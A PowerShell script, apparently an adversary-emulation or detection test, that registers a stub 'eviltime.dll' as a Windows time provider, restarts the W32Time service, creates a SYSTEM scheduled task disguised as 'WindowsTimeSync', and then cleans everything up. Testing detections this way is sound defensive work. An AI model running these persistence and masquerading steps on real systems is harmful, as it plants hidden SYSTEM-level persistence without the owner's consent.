$w32timeDll = "$env:TEMP\eviltime.dll"
$pe = [byte[]]@(0x4D, 0x5A, 0x90, 0x00) + (New-Object byte[] 2044)
$export = [System.Text.Encoding]::ASCII.GetBytes("TimeProvOpen")
[Array]::Copy($export, 0, $pe, 512, $export.Length)
try { [System.IO.File]::WriteAllBytes($w32timeDll, $pe) } catch {}
try { Copy-Item $w32timeDll "$env:SYSTEMROOT\System32\eviltime.dll" -Force -ErrorAction Stop } catch {}

$timeProvKey = "HKLM:\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\EvilTimeProvider"
try {
    New-Item -Path $timeProvKey -Force -ErrorAction Stop | Out-Null
    New-ItemProperty -Path $timeProvKey -Name "DllName" -Value "$env:SYSTEMROOT\System32\eviltime.dll" -PropertyType String -Force -ErrorAction Stop | Out-Null
    New-ItemProperty -Path $timeProvKey -Name "Enabled" -Value 1 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
    New-ItemProperty -Path $timeProvKey -Name "InputProvider" -Value 1 -PropertyType DWord -Force -ErrorAction Stop | Out-Null
} catch {}

& w32tm.exe /config /update 2>&1 | Out-Null
& net.exe stop w32time 2>&1 | Out-Null
& net.exe start w32time 2>&1 | Out-Null

& schtasks.exe /create /tn "WindowsTimeSync" /tr "rundll32.exe $w32timeDll,TimeProvOpen" /sc onlogon /ru SYSTEM /f 2>&1 | Out-Null
& schtasks.exe /delete /tn "WindowsTimeSync" /f 2>&1 | Out-Null

Remove-Item $timeProvKey -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $w32timeDll -Force -ErrorAction SilentlyContinue
Remove-Item "$env:SYSTEMROOT\System32\eviltime.dll" -Force -ErrorAction SilentlyContinue
